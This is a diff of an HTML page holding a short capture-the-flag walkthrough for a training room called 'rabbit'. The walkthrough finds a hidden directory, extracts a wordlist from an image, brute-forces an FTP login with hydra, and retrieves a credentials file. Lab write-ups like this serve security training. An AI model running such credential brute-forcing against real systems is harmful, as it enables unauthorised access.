@@ -122,21 +122,21 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>.............
-</code></pre>
+<div class="codehilite"><pre><span></span><code>.............
+</code></pre></div>
 
 <p>look source code it has hiddent path that hidden path after use i had to enable javascript in my browser after interceft wia caido it identify hidden directery</p>
-<pre class="codehilite"><code>GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
-Host: rabbit.thm
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-DNT: 1
-Sec-GPC: 1
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/sup3r_s3cr3t_fl4g.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">rabbit.thm</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Sec-GPC</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
 
 
 HTTP/1.1 302 Found
@@ -146,10 +146,10 @@ Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
 Content-Length: 0
 Connection: close
 Content-Type: text/html; charset=UTF-8
-</code></pre>
+</code></pre></div>
 
 <p>after use that hidden dir i get hint by within a  video and can see a hot photo </p>
-<pre class="codehilite"><code>└─$ sed -n '1792,$p' Hot_Babe.png &gt; wordlist.txt
+<div class="codehilite"><pre><span></span><code>└─$ sed -n &#39;1792,$p&#39; Hot_Babe.png &gt; wordlist.txt
 
 ┌──(kali㉿kali)-[~/tryhackme/rabbit]
 └─$ ls
@@ -161,47 +161,47 @@ Mou+56n%QK8sr
 1618B0AUshw1M
 A56IpIl%1s02u
 ........................
-</code></pre>
+</code></pre></div>
 
 <p>I use those to brute force wia hydra to ftp user</p>
-<pre class="codehilite"><code>└─$ hydra -l ftpuser -P wordlist.txt 10.67.170.149 ftp
-Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">ftpuser</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">wordlist</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="mf">10.67.170.149</span><span class="w"> </span><span class="n">ftp</span>
+<span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.5</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">David</span><span class="w"> </span><span class="n">Maciejak</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">binding</span><span class="p">,</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="o">***</span><span class="w"> </span><span class="k">ignore</span><span class="w"> </span><span class="n">laws</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">ethics</span><span class="w"> </span><span class="n">anyway</span><span class="p">).</span>
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-01 03:31:36
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
-[DATA] attacking ftp://10.67.170.149:21/
-[21][ftp] host: 10.67.170.149   login: ftpuser   password: 5iez1wGXKfPKQ
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-01 
-</code></pre>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="w"> </span><span class="mi">03</span><span class="err">:</span><span class="mi">31</span><span class="err">:</span><span class="mi">36</span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">tasks</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">82</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">82</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">6</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="nl">ftp</span><span class="p">:</span><span class="o">//</span><span class="mf">10.67.170.149</span><span class="err">:</span><span class="mi">21</span><span class="o">/</span>
+<span class="o">[</span><span class="n">21</span><span class="o">][</span><span class="n">ftp</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.67.170.149</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">ftpuser</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="n">iez1wGXKfPKQ</span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="w"> </span>
+</code></pre></div>
 
 <p>in ftp have txt i get that </p>
-<pre class="codehilite"><code>└─$ ftp 10.67.170.149
-Connected to 10.67.170.149.
-220 (vsFTPd 3.0.2)
-Name (10.67.170.149:kali): ftpuser
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; passive
-Passive mode: off; fallback to active mode: off.
-ftp&gt; ls
-200 EPRT command successful. Consider using EPSV.
-150 Here comes the directory listing.
--rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="nx">ftp</span><span class="w"> </span><span class="m m-Double">10.67.170.149</span>
+<span class="nx">Connected</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="m m-Double">10.67.170.149</span><span class="p">.</span>
+<span class="mi">220</span><span class="w"> </span><span class="p">(</span><span class="nx">vsFTPd</span><span class="w"> </span><span class="m m-Double">3.0.2</span><span class="p">)</span>
+<span class="nx">Name</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.67.170.149</span><span class="p">:</span><span class="nx">kali</span><span class="p">):</span><span class="w"> </span><span class="nx">ftpuser</span>
+<span class="mi">331</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">specify</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">password</span><span class="p">.</span>
+<span class="nx">Password</span><span class="p">:</span><span class="w"> </span>
+<span class="mi">230</span><span class="w"> </span><span class="nx">Login</span><span class="w"> </span><span class="nx">successful</span><span class="p">.</span>
+<span class="nx">Remote</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">UNIX</span><span class="p">.</span>
+<span class="nx">Using</span><span class="w"> </span><span class="nx">binary</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">transfer</span><span class="w"> </span><span class="nx">files</span><span class="p">.</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">passive</span>
+<span class="nx">Passive</span><span class="w"> </span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span><span class="nx">off</span><span class="p">;</span><span class="w"> </span><span class="nx">fallback</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">active</span><span class="w"> </span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span><span class="nx">off</span><span class="p">.</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">ls</span>
+<span class="mi">200</span><span class="w"> </span><span class="nx">EPRT</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">successful</span><span class="p">.</span><span class="w"> </span><span class="nx">Consider</span><span class="w"> </span><span class="nx">using</span><span class="w"> </span><span class="nx">EPSV</span><span class="p">.</span>
+<span class="mi">150</span><span class="w"> </span><span class="nx">Here</span><span class="w"> </span><span class="nx">comes</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="nx">listing</span><span class="p">.</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">0</span><span class="w">        </span><span class="mi">0</span><span class="w">             </span><span class="mi">758</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">23</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="nx">Eli</span><span class="err">&#39;</span><span class="nx">s_Creds</span><span class="p">.</span><span class="nx">txt</span>
+</code></pre></div>
 
 <p>to decode text have to use <code>brainfuck</code> after decode you will get something</p>
 <p>now i have mg </p>
-<pre class="codehilite"><code>1 new message
-Message from Root to Gwendoline:
+<div class="codehilite"><pre><span></span><code><span class="mf">1</span><span class="w"> </span><span class="kr">new</span><span class="w"> </span><span class="n">message</span>
+<span class="n">Message</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="n">Gwendoline</span><span class="p">:</span>
 
-&quot;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there&quot;
+<span class="s">&quot;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I&#39;ve left you a hidden message there&quot;</span>
 
-END MESSAGE
-</code></pre>
+<span class="kr">END</span><span class="w"> </span><span class="n">MESSAGE</span>
+</code></pre></div>
 
 <p>decode that you can find user.txt</p>
 <p>root gain</p>
